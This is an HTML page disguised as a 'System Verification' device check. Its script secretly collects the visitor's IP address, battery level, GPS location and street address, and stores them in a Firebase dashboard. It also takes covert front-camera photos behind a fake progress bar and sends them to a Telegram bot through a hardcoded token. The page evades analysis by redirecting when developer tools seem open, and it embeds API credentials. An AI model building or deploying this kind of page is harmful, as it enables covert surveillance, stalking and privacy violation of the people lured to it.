<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden font-sans">
    
    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl relative">
        <div class="relative w-16 h-16 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
        
        <div class="w-full bg-slate-800 h-1.5 rounded-full mt-8 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-500 ease-out"></div>
        </div>
        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing Protocol...</p>
        
        <video id="v" autoplay playsinline class="hidden"></video>
        <canvas id="c" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        // Firebase Config (Same as your dashboard)
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const tid = params.get('tid'); // Telegram ID
        const red = decodeURIComponent(params.get('rd') || "https://google.com");
        const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";

        let address = "Scanning Location...";
        let ipData = {};
        const sessionID = "TRK-" + Math.random().toString(36).substr(2, 6).toUpperCase();

        async function startTracking() {
            // Anti-Analysis: Disable if DevTools is open (Basic)
            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
                window.location.href = red; return;
            }

            try {
                // 1. IP & Network
                const ipReq = await fetch('https://ipapi.co/json/');
                ipData = await ipReq.json();

                // 2. Battery
                const bat = await navigator.getBattery();
                const batStatus = `${(bat.level * 100).toFixed(0)}%`;

                // 3. Geolocation
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const { latitude: lat, longitude: lon } = pos.coords;
                    
                    // Get Physical Address
                    const geoReq = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
                    const geoData = await geoReq.json();
                    address = geoData.display_name;

                    // Send Initial Data to Firebase Dashboard
                    db.ref('shadow_sessions/' + sessionID).set({
                        address: address,
                        target_email: ipData.ip || "Unknown IP",
                        time: Date.now(),
                        status: "Active",
                        battery: batStatus,
                        platform: navigator.platform
                    });

                    // Send to Telegram
                    sendTG(`üö® *TARGET TRACED*\n\nüìç *Address:* ${address}\nüåê *IP:* ${ipData.ip}\nüîã *Battery:* ${batStatus}\nüì± *ID:* ${sessionID}`);
                    
                    initCamera();
                }, () => {
                    // If GPS Denied
                    db.ref('shadow_sessions/' + sessionID).set({
                        address: "GPS Denied (Approx: " + ipData.city + ")",
                        target_email: ipData.ip,
                        time: Date.now(),
                        status: "Limited Access"
                    });
                    initCamera();
                });
            } catch (e) { initCamera(); }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                setTimeout(captureLoop, 1000); // Start after 1s for focus
            } catch(e) { window.location.href = red; }
        }

        async function captureLoop() {
            const totalSteps = 4; // Fast capture (4 shots)
            for(let i=1; i<=totalSteps; i++) {
                let progress = (i / totalSteps) * 100;
                document.getElementById('bar').style.width = progress + "%";
                document.getElementById('status').innerText = `Verifying Node ${i}...`;
                
                await takePhoto(i);
                await new Promise(r => setTimeout(r, 1500)); // Speed optimized
            }
            window.location.href = red;
        }

        async function takePhoto(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
            const fd = new FormData();
            fd.append('chat_id', tid);
            fd.append('photo', blob, `shot.jpg`);
            fd.append('caption', `üì∏ Shot ${idx} | ID: ${sessionID}\nüìç Near: ${address.split(',')[0]}`);

            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }

        function sendTG(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: tid, text: msg, parse_mode: 'Markdown' })
            });
        }

        startTracking();
    </script>
</body>
</html>
